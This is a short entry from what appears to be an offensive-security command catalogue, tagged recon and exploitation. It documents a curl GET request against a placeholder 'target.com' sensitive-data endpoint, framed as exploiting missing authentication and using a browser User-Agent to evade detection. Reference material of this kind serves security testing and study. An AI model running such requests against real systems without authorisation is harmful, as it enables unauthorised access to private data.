---
id: 00000000-0000-0000-0000-000000000003
name: curl-api-access
type: command
executor: bash
data: 'curl -X GET https://target.com/api/sensitive-data -H "User-Agent: Mozilla/5.0"'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.371Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - recon
  - exploitation
  - http
verified: false
validated: true
submitted: true
---

# curl-api-access

## Command

```bash
curl -X GET https://target.com/api/sensitive-data -H "User-Agent: Mozilla/5.0"
```

## Description

This command uses curl to perform an unauthenticated GET request to a public API endpoint, exploiting improper authentication to retrieve sensitive data. It is used in scenarios where endpoints lack access controls, allowing direct information disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `https://target.com/api/sensitive-data` | The URL of the vulnerable API endpoint | Yes |
| `-H "User-Agent: Mozilla/5.0"` | Sets a browser-like User-Agent header to evade basic detection | No |

## Examples

### Basic Usage

```bash
curl -X GET https://target.com/api/sensitive-data
```

### Advanced Usage

```bash
curl -X GET https://target.com/api/sensitive-data -H "User-Agent: Mozilla/5.0" -v
```

Adds verbose output (-v) for debugging headers and responses.

## Expected Output

A successful response will return HTTP 200 with JSON data, e.g., {"data": [{"dummy": "placeholder"}, {"real": "sensitive-info"}]}, indicating leaked information without authentication errors.

## Related

- [[Related Procedure|procedures/Access-Unauthenticated-API-Endpoint]]
